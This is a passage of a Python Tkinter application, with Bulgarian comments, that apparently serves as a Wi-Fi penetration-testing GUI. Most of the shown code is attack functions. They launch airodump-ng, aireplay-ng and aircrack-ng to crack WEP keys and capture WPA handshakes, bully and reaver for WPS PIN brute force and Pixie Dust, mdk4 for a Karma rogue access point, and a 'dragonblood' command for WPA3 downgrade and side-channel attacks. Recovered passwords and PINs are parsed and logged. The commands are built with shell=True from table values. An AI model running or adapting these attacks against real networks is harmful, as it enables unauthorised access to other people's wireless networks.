                # Добавяме клиенти (опростено)
                clients = len([l for l in lines if l.startswith(bssid[:8])])
                
                item_id = self.network_table.insert("", tk.END, values=(
                    bssid, essid, channel, power, wps_status, encryption, clients, vendor
                ))
                
                # Възстановяваме избраните редове
                if bssid in selected_bssids:
                    self.network_table.selection_add(item_id)
                
                networks.append({"ESSID": essid, "Power": power, "BSSID": bssid})
                current_bssids.add(bssid)
            
            self.update_graph(networks)
            
        except Exception as e:
            self.log_queue.put((f"Грешка при обновяване на резултатите: {str(e)}", "error"))

    def get_vendor(self, mac):
        """Определя производителя по MAC адрес (опростена версия)."""
        oui = mac[:8].upper()
        vendors = {
            "00:14:6C": "Netgear",
            "00:40:96": "Cisco",
            "00:0C:42": "D-Link",
            "00:1A:2B": "TP-Link",
            "00:1D:0F": "Belkin",
            "00:25:9C": "Asus",
            "00:26:5A": "Huawei"
        }
        return vendors.get(oui, "Неизвестен")

    def update_graph(self, networks):
        """Обновява графиката за сила на сигнала."""
        if not networks:
            return
            
        self.ax.clear()
        
        # Сортираме мрежите по сила на сигнала
        networks_sorted = sorted(networks, key=lambda x: int(x["Power"]), reverse=True)[:10]  # Показваме само топ 10
        
        essids = [n["ESSID"][:15] + "..." if len(n["ESSID"]) > 15 else n["ESSID"] for n in networks_sorted]
        powers = [int(n["Power"]) for n in networks_sorted]
        
        bars = self.ax.barh(essids, powers, color="#4CAF50")
        self.ax.bar_label(bars, fmt="%d dBm", padding=5, color="white")
        
        self.ax.set_title("Топ 10 мрежи по сила на сигнала", color="white")
        self.ax.set_xlabel("Сигнал (dBm)", color="white")
        self.ax.set_facecolor("#2D2D2D")
        self.ax.tick_params(colors="white")
        
        self.fig.tight_layout()
        self.canvas.draw()

    def save_scan_results(self, results):
        """Запазва резултатите от сканирането."""
        try:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            data = {"timestamp": timestamp, "networks": results}
            
            # Запазваме в JSON
            with open(f"{self.output_dir}/scan_results.json", "a") as f:
                json.dump(data, f)
                f.write("\n")
                
            # Запазваме в CSV за по-лесен анализ
            with open(f"{self.output_dir}/scan_results.csv", "a") as f:
                if os.path.getsize(f"{self.output_dir}/scan_results.csv") == 0:
                    f.write("Timestamp,ESSID,BSSID,Channel,Power,WPS,Encryption\n")
                    
                for net in results:
                    f.write(f"{timestamp},{net['ESSID']},{net.get('BSSID', '')},"
                            f"{net.get('Channel', '')},{net['Power']},"
                            f"{net.get('WPS', 'Не')},{net.get('Encryption', '')}\n")
                            
            self.log_message("Резултатите са запазени.", "success")
        except Exception as e:
            self.log_message(f"Грешка при запазване на резултатите: {str(e)}", "error")

    def select_interface(self):
        """Показва диалог за избор на интерфейс"""
        interfaces = self.get_available_interfaces()
        if interfaces:
            dialog = tk.Toplevel(self)
            dialog.title("Избор на интерфейс")
            dialog.geometry("500x500")
            dialog.configure(bg="#1E1E1E")
            
            ttk.Label(dialog, text="Изберете WiFi интерфейс:").pack(pady=10)
            
            listbox = tk.Listbox(dialog, bg="#2D2D2D", fg="white", selectbackground="#4CAF50")
            for iface in interfaces:
                listbox.insert(tk.END, iface)
            listbox.pack(fill="both", expand=True, padx=10, pady=5)
            
            def select():
                selection = listbox.curselection()
                if selection:
                    self.interface.set(listbox.get(selection[0]))
                    dialog.destroy()
                    
            ttk.Button(dialog, text="Избери", command=select).pack(pady=5)
        else:
            self.log_message("Няма налични WiFi интерфейси.", "error")

    def get_available_interfaces(self):
        """Връща списък с наличните WiFi интерфейси"""
        try:
            result = subprocess.check_output("iwconfig 2>/dev/null | grep -o '^\\w*'", shell=True, text=True)
            return result.splitlines()
        except:
            return ["wlan0"]

    def wep_attack(self):
        """Изпълнява WEP атака"""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете WEP мрежа", "warning")
            return
        
        bssid = self.network_table.item(selected[0])["values"][0]
        channel = self.network_table.item(selected[0])["values"][2]
        essid = self.network_table.item(selected[0])["values"][1]
        
        self.log_message(f"Стартиране на WEP атака срещу {essid} ({bssid})")
        
        # Създаваме прозорец за проследяване
        wep_window = tk.Toplevel(self)
        wep_window.title(f"WEP атака: {essid}")
        wep_window.geometry("700x500")
        
        # Добавяме информация за атаката
        info_frame = ttk.Frame(wep_window)
        info_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(info_frame, text="Мрежа:").pack(side="left")
        ttk.Label(info_frame, text=essid, foreground="#4CAF50").pack(side="left", padx=5)
        
        ttk.Label(info_frame, text="BSSID:").pack(side="left", padx=10)
        ttk.Label(info_frame, text=bssid, foreground="#4CAF50").pack(side="left")
        
        # Добавяме лог
        wep_log = tk.Text(wep_window, height=20, bg="#2D2D2D", fg="white", 
                         insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(wep_window, command=wep_log.yview)
        wep_log.configure(yscrollcommand=scrollbar.set)
        
        wep_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(wep_window, text="Спри атаката", 
                               command=lambda: self.stop_attack("WEP"))
        stop_button.pack(pady=5)
        
        # Стартираме атаката в отделен thread
        def run_wep_attack():
            try:
                # Захващаме IV пакети
                cap_file = f"{self.cap_files_dir}/wep_capture_{int(time.time())}"
                command = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {cap_file} {self.interface.get()}"
                airodump = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                          stderr=subprocess.PIPE, text=True)
                
                # Използваме aireplay-ng за генериране на трафик
                command = f"sudo aireplay-ng -3 -b {bssid} {self.interface.get()}"
                aireplay = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                          stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["WEP"] = {
                    "processes": [airodump, aireplay],
                    "window": wep_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                # Проверяваме за достатъчно IV пакети
                while True:
                    line = airodump.stderr.readline()
                    if not line:
                        break
                    
                    wep_log.insert(tk.END, line)
                    wep_log.see(tk.END)
                    
                    if "IVs" in line and int(line.split("IVs")[0].strip()) > 10000:
                        wep_log.insert(tk.END, "\nДостатъчно IV пакети, започваме кракване...\n")
                        
                        # Стартираме aircrack-ng
                        crack_cmd = f"sudo aircrack-ng {cap_file}-01.cap"
                        aircrack = subprocess.Popen(crack_cmd, shell=True, stdout=subprocess.PIPE, 
                                                  stderr=subprocess.PIPE, text=True)
                        
                        self.active_attacks["WEP"]["processes"].append(aircrack)
                        
                        while True:
                            line = aircrack.stdout.readline()
                            if not line:
                                break
                            
                            wep_log.insert(tk.END, line)
                            wep_log.see(tk.END)
                            
                            if "KEY FOUND" in line:
                                password = line.split("[")[-1].split("]")[0]
                                wep_log.insert(tk.END, f"\n\nУСПЕХ! Намерена парола: {password}\n", "success")
                                self.log_message(f"Успешно намерена WEP парола: {password}", "success")
                                break
                        
                        break
                
                # Спираме процесите
                for p in self.active_attacks["WEP"]["processes"]:
                    p.terminate()
                
                self.active_attacks["WEP"]["status"] = "completed"
                
            except Exception as e:
                wep_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["WEP"]["status"] = "failed"
        
        threading.Thread(target=run_wep_attack, daemon=True).start()

    def add_wordlist(self):
        """Добавя речник"""
        file = filedialog.askopenfilename(title="Изберете речник", filetypes=[("Text files", "*.txt")])
        if file:
            try:
                shutil.copy(file, self.wordlists_dir)
                self.log_message(f"Речникът {os.path.basename(file)} е добавен", "success")
                self.update_wordlists()
            except Exception as e:
                self.log_message(f"Грешка при добавяне на речник: {e}", "error")

    def add_cap_file(self):
        """Добавя .cap файл"""
        file = filedialog.askopenfilename(title="Изберете .cap файл", filetypes=[("Capture files", "*.cap *.pcapng")])
        if file:
            try:
                shutil.copy(file, self.cap_files_dir)
                self.log_message(f"Файлът {os.path.basename(file)} е добавен", "success")
            except Exception as e:
                self.log_message(f"Грешка при добавяне на файл: {e}", "error")

    def convert_selected_cap(self):
        """Конвертира избрания cap файл"""
        if not self.crack_file.get():
            self.log_message("Моля, изберете .cap файл първо", "warning")
            return
            
        result = self.convert_cap_to_hccapx(self.crack_file.get())
        if result:
            self.log_message(f"Файлът е конвертиран: {result}", "success")
            self.crack_file.delete(0, tk.END)
            self.crack_file.insert(0, result)

    def add_hashcat_rules(self):
        """Добавя правила за Hashcat"""
        file = filedialog.askopenfilename(title="Изберете файл с правила", filetypes=[("Rule files", "*.rule")])
        if file:
            try:
                shutil.copy(file, self.wordlists_dir)
                self.log_message(f"Правилата {os.path.basename(file)} са добавени", "success")
            except Exception as e:
                self.log_message(f"Грешка при добавяне на правила: {e}", "error")

    def export_html(self):
        """Експортира резултатите в HTML"""
        file = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML files", "*.html")])
        if file:
            try:
                with open(file, "w") as f:
                    f.write("<html><body><h1>WiFi GUI Pentest Report</h1>")
                    f.write(f"<p>Генерирано на: {time.ctime()}</p>")
                    f.write("</body></html>")
                self.log_message(f"Докладът е експортиран в {file}", "success")
            except Exception as e:
                self.log_message(f"Грешка при експорт: {e}", "error")

    def show_settings(self):
        """Показва текущите настройки на инструмента."""
        dialog = tk.Toplevel(self)
        dialog.title("Настройки")
        dialog.geometry("600x600")
        dialog.configure(bg="#1E1E1E")

        # Заглавие
        ttk.Label(dialog, text="Конфигурация на инструмента", font=("Arial", 12, "bold")).pack(pady=10)

        # Настройки
        settings_frame = ttk.Frame(dialog)
        settings_frame.pack(fill="both", expand=True, padx=10, pady=10)

        settings = {
            "Интерфейс": self.interface.get(),
            "Филтър WPA/WEP": self.filter_encryption.get(),
            "Само WPS": "Да" if self.filter_wps.get() else "Не",
            "WPA3 поддръжка": "Да" if self.wpa3_support.get() else "Не",
            "GPU ускорение": "Да" if self.gpu_acceleration.get() else "Не",
            "Стелт режим": "Да" if self.stealth_mode.get() else "Не",
            "Максимални паралелни атаки": self.concurrent_attacks.get()
        }

        for key, value in settings.items():
            ttk.Label(settings_frame, text=f"{key}:").pack(anchor="w")
            ttk.Label(settings_frame, text=f"{value}", foreground="#4CAF50").pack(anchor="w", pady=(0, 5))

        # Бутон за затваряне
        ttk.Button(dialog, text="Затвори", command=dialog.destroy).pack(pady=10)

    def refresh_interfaces(self):
        """Обновява списъка с интерфейси"""
        self.interface.set(self.get_available_interfaces()[0])
        self.log_message("Интерфейсите са обновени", "success")

    def capture_handshake(self):
        """Подобрено захващане на WPA хендшейк"""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа", "warning")
            return
        
        bssid = self.network_table.item(selected[0])["values"][0]
        channel = self.network_table.item(selected[0])["values"][2]
        essid = self.network_table.item(selected[0])["values"][1]
        
        self.log_message(f"Започва захващане на хендшейк за {essid} ({bssid})")
        
        # Създаваме отделен прозорец за проследяване
        handshake_window = tk.Toplevel(self)
        handshake_window.title(f"Хендшейк захват: {essid}")
        handshake_window.geometry("600x400")
        
        # Добавяме текст за статус
        status_label = ttk.Label(handshake_window, text="Очакване на хендшейк...", font=('Arial', 12))
        status_label.pack(pady=10)
        
        # Добавяме лог
        handshake_log = tk.Text(handshake_window, height=15, bg="#2D2D2D", fg="white", 
                              insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(handshake_window, command=handshake_log.yview)
        handshake_log.configure(yscrollcommand=scrollbar.set)
        
        handshake_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(handshake_window, text="Спри захвата", 
                               command=lambda: self.stop_attack("Handshake"))
        stop_button.pack(pady=5)
        
        # Стартираме airodump-ng в отделен thread
        cap_file = f"{self.cap_files_dir}/handshake_{int(time.time())}"
        command = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {cap_file} {self.interface.get()}"
        
        def run_handshake_capture():
            try:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["Handshake"] = {
                    "process": process,
                    "window": handshake_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                # Проверяваме за хендшейк в реално време
                while True:
                    line = process.stderr.readline()
                    if not line:
                        break
                    
                    handshake_log.insert(tk.END, line)
                    handshake_log.see(tk.END)
                    
                    if "WPA handshake" in line:
                        status_label.config(text="Хендшейк заловен!", foreground="green")
                        self.log_message(f"Успешно заловен хендшейк за {essid}", "success")
                        self.handshake_captured = True
                        break
                
                process.terminate()
                self.active_attacks["Handshake"]["status"] = "completed"
                
            except Exception as e:
                handshake_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["Handshake"]["status"] = "failed"
        
        threading.Thread(target=run_handshake_capture, daemon=True).start()

    def show_context_menu(self, event):
        """Показва контекстно меню за избраната мрежа"""
        item = self.network_table.identify_row(event.y)
        if item:
            self.network_table.selection_set(item)
            values = self.network_table.item(item)["values"]
            
            # Проверка дали мрежата има WPS
            if values[4] == "Да":  # WPS колона
                self.context_menu = tk.Menu(self, tearoff=0)
                self.context_menu.add_command(label="WPS детайли", command=self.show_wps_details)
                self.context_menu.add_command(label="Pixie Dust тест", command=self.pixie_dust_test)
                self.context_menu.add_command(label="WPS brute force", command=self.wps_brute_force)
                self.context_menu.post(event.x_root, event.y_root)
            else:
                self.log_message("Избраната мрежа няма WPS", "warning")

    def packet_analysis(self):
        """Анализира пакети"""
        if not glob.glob(f"{self.cap_files_dir}/*.cap"):
            self.log_message("Няма .cap файлове за анализ", "warning")
            return
        
        self.log_message("Стартиране на анализ на пакети...")
        command = f"sudo wireshark {self.cap_files_dir}/*.cap"
        subprocess.Popen(command, shell=True)

    def save_report(self):
        """Запазва доклада във файл"""
        content = self.report_content.get("1.0", tk.END)
        file = filedialog.asksaveasfilename(defaultextension=".txt",
                                        filetypes=[("Text files", "*.txt"),
                                                    ("All files", "*.*")])
        if file:
            try:
                with open(file, "w") as f:
                    f.write(content)
                self.log_message(f"Докладът е запазен във {file}", "success")
            except Exception as e:
                self.log_message(f"Грешка при запазване: {str(e)}", "error")

    def preview_report(self):
        """Преглед на доклада"""
        content = self.report_content.get("1.0", tk.END)
        dialog = tk.Toplevel(self)
        dialog.title("Преглед на доклад")
        text = tk.Text(dialog, wrap="word")
        text.insert(tk.END, content)
        text.pack(fill="both", expand=True)

    def sae_downgrade_attack(self):
        """Изпълнява SAE Downgrade атака за WPA3"""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете WPA3 мрежа", "warning")
            return
        
        bssid = self.network_table.item(selected[0])["values"][0]
        essid = self.network_table.item(selected[0])["values"][1]
        
        self.log_message(f"Стартиране на SAE Downgrade атака срещу {essid}")
        
        # Създаваме прозорец за проследяване
        wpa3_window = tk.Toplevel(self)
        wpa3_window.title(f"WPA3 SAE Downgrade: {essid}")
        wpa3_window.geometry("700x500")
        
        # Добавяме информация за атаката
        info_frame = ttk.Frame(wpa3_window)
        info_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(info_frame, text="Мрежа:").pack(side="left")
        ttk.Label(info_frame, text=essid, foreground="#4CAF50").pack(side="left", padx=5)
        
        ttk.Label(info_frame, text="BSSID:").pack(side="left", padx=10)
        ttk.Label(info_frame, text=bssid, foreground="#4CAF50").pack(side="left")
        
        # Добавяме лог
        wpa3_log = tk.Text(wpa3_window, height=20, bg="#2D2D2D", fg="white", 
                         insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(wpa3_window, command=wpa3_log.yview)
        wpa3_log.configure(yscrollcommand=scrollbar.set)
        
        wpa3_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(wpa3_window, text="Спри атаката", 
                               command=lambda: self.stop_attack("WPA3"))
        stop_button.pack(pady=5)
        
        # Стартираме атаката в отделен thread
        def run_sae_downgrade():
            try:
                command = f"sudo dragonblood --sae-downgrade -b {bssid} -i {self.interface.get()}"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["WPA3"] = {
                    "process": process,
                    "window": wpa3_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    
                    wpa3_log.insert(tk.END, line)
                    wpa3_log.see(tk.END)
                    
                    if "Successful downgrade" in line:
                        wpa3_log.insert(tk.END, "\n\nУСПЕХ! Успешно downgrade на WPA3 до WPA2\n", "success")
                        self.log_message("Успешно downgrade на WPA3 до WPA2", "success")
                        break
                
                process.terminate()
                self.active_attacks["WPA3"]["status"] = "completed"
                
            except Exception as e:
                wpa3_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["WPA3"]["status"] = "failed"
        
        threading.Thread(target=run_sae_downgrade, daemon=True).start()

    def side_channel_attack(self):
        """Изпълнява Side-Channel атака за WPA3"""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете WPA3 мрежа", "warning")
            return
        
        bssid = self.network_table.item(selected[0])["values"][0]
        essid = self.network_table.item(selected[0])["values"][1]
        
        self.log_message(f"Стартиране на Side-Channel атака срещу {essid}")
        
        # Създаваме прозорец за проследяване
        wpa3_window = tk.Toplevel(self)
        wpa3_window.title(f"WPA3 Side-Channel: {essid}")
        wpa3_window.geometry("700x500")
        
        # Добавяме информация за атаката
        info_frame = ttk.Frame(wpa3_window)
        info_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(info_frame, text="Мрежа:").pack(side="left")
        ttk.Label(info_frame, text=essid, foreground="#4CAF50").pack(side="left", padx=5)
        
        ttk.Label(info_frame, text="BSSID:").pack(side="left", padx=10)
        ttk.Label(info_frame, text=bssid, foreground="#4CAF50").pack(side="left")
        
        # Добавяме лог
        wpa3_log = tk.Text(wpa3_window, height=20, bg="#2D2D2D", fg="white", 
                         insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(wpa3_window, command=wpa3_log.yview)
        wpa3_log.configure(yscrollcommand=scrollbar.set)
        
        wpa3_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(wpa3_window, text="Спри атаката", 
                            command=lambda: self.stop_attack("WPA3_SC"))
        stop_button.pack(pady=5)
        

    
        # Стартираме атаката в отделен thread
        def run_side_channel():
            try:
                command = f"sudo dragonblood --side-channel -b {bssid} -i {self.interface.get()}"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["WPA3_SC"] = {
                    "process": process,
                    "window": wpa3_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    
                    wpa3_log.insert(tk.END, line)
                    wpa3_log.see(tk.END)
                    
                    if "Password recovered" in line:
                        password = line.split(":")[-1].strip()
                        wpa3_log.insert(tk.END, f"\n\nУСПЕХ! Намерена парола: {password}\n", "success")
                        self.log_message(f"Успешно намерена WPA3 парола: {password}", "success")
                        break
                
                process.terminate()
                self.active_attacks["WPA3_SC"]["status"] = "completed"
                
            except Exception as e:
                wpa3_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["WPA3_SC"]["status"] = "failed"
        
        threading.Thread(target=run_side_channel, daemon=True).start()

    def karma_attack(self):
        """Изпълнява Karma атака"""
        self.log_message("Стартиране на Karma атака...")
        
        # Създаваме прозорец за проследяване
        karma_window = tk.Toplevel(self)
        karma_window.title("Karma атака")
        karma_window.geometry("700x500")
        
        # Добавяме лог
        karma_log = tk.Text(karma_window, height=20, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(karma_window, command=karma_log.yview)
        karma_log.configure(yscrollcommand=scrollbar.set)
        
        karma_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(karma_window, text="Спри атаката", 
                            command=lambda: self.stop_attack("Karma"))
        stop_button.pack(pady=5)
        
        # Стартираме атаката в отделен thread
        def run_karma_attack():
            try:
                command = f"sudo mdk4 {self.interface.get()} k"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["Karma"] = {
                    "process": process,
                    "window": karma_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    
                    karma_log.insert(tk.END, line)
                    karma_log.see(tk.END)
                
                process.terminate()
                self.active_attacks["Karma"]["status"] = "completed"
                
            except Exception as e:
                karma_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["Karma"]["status"] = "failed"
        
        threading.Thread(target=run_karma_attack, daemon=True).start()

    def wps_attack(self, bssid=None):
        """Подобрена WPS атака с повече информация"""
        if not bssid:
            selected = self.network_table.selection()
            if not selected:
                self.log_attack("WPS", "Моля, изберете мрежа.", "warning")
                return
            bssid = self.network_table.item(selected[0])["values"][0]
            essid = self.network_table.item(selected[0])["values"][1]
        
        self.log_attack("WPS", f"Стартиране на WPS атака срещу {essid} ({bssid})")
        
        # Създаваме прозорец за проследяване
        wps_window = tk.Toplevel(self)
        wps_window.title(f"WPS атака: {essid}")
        wps_window.geometry("700x500")
        
        # Добавяме информация за атаката
        info_frame = ttk.Frame(wps_window)
        info_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(info_frame, text="Мрежа:").pack(side="left")
        ttk.Label(info_frame, text=essid, foreground="#4CAF50").pack(side="left", padx=5)
        
        ttk.Label(info_frame, text="BSSID:").pack(side="left", padx=10)
        ttk.Label(info_frame, text=bssid, foreground="#4CAF50").pack(side="left")
        
        # Добавяме лог
        wps_log = tk.Text(wps_window, height=20, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(wps_window, command=wps_log.yview)
        wps_log.configure(yscrollcommand=scrollbar.set)
        
        wps_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(wps_window, text="Спри атаката", 
                            command=lambda: self.stop_attack("WPS"))
        stop_button.pack(pady=5)
        
        # Стартираме атаката в отделен thread
        def run_wps_attack():
            try:
                command = f"sudo bully -b {bssid} -i {self.interface.get()} -v 3 -o {self.output_dir}/wps_cracked.txt"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["WPS"] = {
                    "process": process,
                    "window": wps_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    
                    wps_log.insert(tk.END, line)
                    wps_log.see(tk.END)
                    
                    if "WPS PIN:" in line:
                        pin = line.split(":")[1].strip()
                        wps_log.insert(tk.END, f"\nУСПЕХ! Намерен WPS PIN: {pin}\n", "success")
                        self.log_attack("WPS", f"Успешно намерен PIN: {pin}", "success")
                        break
                
                process.terminate()
                self.active_attacks["WPS"]["status"] = "completed"
                
            except Exception as e:
                wps_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["WPS"]["status"] = "failed"
        
        threading.Thread(target=run_wps_attack, daemon=True).start()

    def offline_pin_attack(self):
        """Изпълнява офлайн WPS PIN атака"""
        selected = self.network_table.selection()
        if not selected:
            self.log_message("Моля, изберете мрежа.", "warning")
            return
        
        bssid = self.network_table.item(selected[0])["values"][0]
        essid = self.network_table.item(selected[0])["values"][1]
        
        self.log_message(f"Стартиране на офлайн WPS PIN атака срещу {essid}")
        
        # Създаваме прозорец за проследяване
        pin_window = tk.Toplevel(self)
        pin_window.title(f"Offline PIN атака: {essid}")
        pin_window.geometry("700x500")
        
        # Добавяме информация за атаката
        info_frame = ttk.Frame(pin_window)
        info_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(info_frame, text="Мрежа:").pack(side="left")
        ttk.Label(info_frame, text=essid, foreground="#4CAF50").pack(side="left", padx=5)
        
        ttk.Label(info_frame, text="BSSID:").pack(side="left", padx=10)
        ttk.Label(info_frame, text=bssid, foreground="#4CAF50").pack(side="left")
        
        # Добавяме лог
        pin_log = tk.Text(pin_window, height=20, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(pin_window, command=pin_log.yview)
        pin_log.configure(yscrollcommand=scrollbar.set)
        
        pin_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(pin_window, text="Спри атаката", 
                            command=lambda: self.stop_attack("WPS_PIN"))
        stop_button.pack(pady=5)
        
        # Стартираме атаката в отделен thread
        def run_pin_attack():
            try:
                command = f"sudo reaver -i {self.interface.get()} -b {bssid} -K 1 -o {self.output_dir}/wps_offline.txt"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["WPS_PIN"] = {
                    "process": process,
                    "window": pin_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    
                    pin_log.insert(tk.END, line)
                    pin_log.see(tk.END)
                    
                    if "WPS PIN:" in line:
                        pin = line.split(":")[1].strip()
                        pin_log.insert(tk.END, f"\nУСПЕХ! Намерен WPS PIN: {pin}\n", "success")
                        self.log_message(f"Успешно намерен WPS PIN: {pin}", "success")
                        break
                
                process.terminate()
                self.active_attacks["WPS_PIN"]["status"] = "completed"
                
            except Exception as e:
                pin_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["WPS_PIN"]["status"] = "failed"
        
        threading.Thread(target=run_pin_attack, daemon=True).start()

    def pixie_dust_attack(self, bssid=None):
        """Изпълнява Pixie Dust атака срещу WPS."""
        if not bssid:
            selected = self.network_table.selection()
            if not selected:
                self.log_message("Моля, изберете мрежа.", "warning")
                return
            bssid = self.network_table.item(selected[0])["values"][0]
            essid = self.network_table.item(selected[0])["values"][1]
        
        self.log_message(f"Стартиране на Pixie Dust атака срещу {essid}")
        
        # Създаваме прозорец за проследяване
        pixie_window = tk.Toplevel(self)
        pixie_window.title(f"Pixie Dust атака: {essid}")
        pixie_window.geometry("700x500")
        
        # Добавяме информация за атаката
        info_frame = ttk.Frame(pixie_window)
        info_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(info_frame, text="Мрежа:").pack(side="left")
        ttk.Label(info_frame, text=essid, foreground="#4CAF50").pack(side="left", padx=5)
        
        ttk.Label(info_frame, text="BSSID:").pack(side="left", padx=10)
        ttk.Label(info_frame, text=bssid, foreground="#4CAF50").pack(side="left")
        
        # Добавяме лог
        pixie_log = tk.Text(pixie_window, height=20, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(pixie_window, command=pixie_log.yview)
        pixie_log.configure(yscrollcommand=scrollbar.set)
        
        pixie_log.pack(side="left", fill="both", expand=True, pady=5)
        scrollbar.pack(side="right", fill="y")
        
        # Добавяме бутон за спиране
        stop_button = ttk.Button(pixie_window, text="Спри атаката", 
                            command=lambda: self.stop_attack("Pixie"))
        stop_button.pack(pady=5)
        
        # Стартираме атаката в отделен thread
        def run_pixie_attack():
            try:
                command = f"sudo bully -b {bssid} -i {self.interface.get()} -d -o {self.output_dir}/wps_pixie.txt"
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, text=True)
                
                self.active_attacks["Pixie"] = {
                    "process": process,
                    "window": pixie_window,
                    "start_time": datetime.now(),
                    "status": "running"
                }
                
                while True:
                    line = process.stdout.readline()
                    if not line:
                        break
                    
                    pixie_log.insert(tk.END, line)
                    pixie_log.see(tk.END)
                    
                    if "WPS PIN:" in line:
                        pin = line.split(":")[1].strip()
                        pixie_log.insert(tk.END, f"\nУСПЕХ! Намерен WPS PIN: {pin}\n", "success")
                        self.log_message(f"Успешно намерен WPS PIN: {pin}", "success")
                        break
                
                process.terminate()
                self.active_attacks["Pixie"]["status"] = "completed"
                
            except Exception as e:
                pixie_log.insert(tk.END, f"Грешка: {str(e)}")
                self.active_attacks["Pixie"]["status"] = "failed"
        
        threading.Thread(target=run_pixie_attack, daemon=True).start()

    def wpa_attack(self, bssid=None):
        """Изпълнява WPA/WPA2 атака."""
        if not bssid:
            selected = self.network_table.selection()
            if not selected:
                self.log_message("Моля, изберете мрежа.", "warning")
                return
            bssid = self.network_table.item(selected[0])["values"][0]
            channel = self.network_table.item(selected[0])["values"][2]
            essid = self.network_table.item(selected[0])["values"][1]
        
        self.log_message(f"Стартиране на WPA/WPA2 атака срещу {essid}")
        
        # Създаваме прозорец за проследяване
        wpa_window = tk.Toplevel(self)
        wpa_window.title(f"WPA/WPA2 атака: {essid}")
        wpa_window.geometry("700x500")
        
        # Добавяме информация за атаката
        info_frame = ttk.Frame(wpa_window)
        info_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(info_frame, text="Мрежа:").pack(side="left")
        ttk.Label(info_frame, text=essid, foreground="#4CAF50").pack(side="left", padx=5)
        
        ttk.Label(info_frame, text="BSSID:").pack(side="left", padx=10)
        ttk.Label(info_frame, text=bssid, foreground="#4CAF50").pack(side="left")
        
        # Добавяме лог
        wpa_log = tk.Text(wpa_window, height=20, bg="#2D2D2D", fg="white", 
                        insertbackground="white", wrap="word")
        scrollbar = ttk.Scrollbar(wpa_window, command=wpa_log.yview)
        wpa_log.configure(yscrollcommand=scrollbar.set)
        
